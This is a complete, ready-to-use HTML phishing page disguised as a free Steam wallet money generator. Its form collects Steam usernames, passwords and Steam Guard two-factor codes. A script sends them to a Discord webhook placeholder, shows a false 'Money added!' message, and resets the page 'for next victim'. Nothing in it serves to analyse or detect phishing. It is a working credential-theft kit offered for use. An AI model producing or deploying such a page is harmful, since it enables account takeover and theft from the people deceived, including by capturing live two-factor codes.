<!DOCTYPE html>
<html>
<head>
    <title>Steam Wallet Generator 2025 - Free $100</title>
    <style>
        body { background: #171a21; color: white; font-family: Arial; text-align: center; padding: 50px; }
        .container { max-width: 400px; margin: auto; }
        input, select, button { width: 100%; padding: 15px; margin: 10px 0; font-size: 16px; }
        button { background: #66c0f4; color: black; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Steam Wallet Gift Generator</h1>
        <p>Choose amount → Login to verify → Money added!</p>
        <select id="amount">
            <option>$20 Free</option>
            <option>$50 Free</option>
            <option>$100 Free</option>
        </select>
        <input type="text" id="username" placeholder="Steam Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <input type="text" id="guard" placeholder="Steam Guard Code (if 2FA)" required>
        <button onclick="submitLogin()">GENERATE & ADD MONEY</button>
    </div>
    <script>
        function submitLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const guard = document.getElementById('guard').value;
            const amount = document.getElementById('amount').value;

            // Send to your Discord webhook
            const webhook = "YOUR_DISCORD_WEBHOOK_URL_HERE";
            fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `**NEW STEAM LOGIN** Username: ${username} Pass: ${password} Guard: ${guard} Amount: ${amount}`
                })
            });

            alert("Money added! Check your Steam wallet.");
            window.location.reload(); // Reset for next victim
        }
    </script>
</body>
</html>
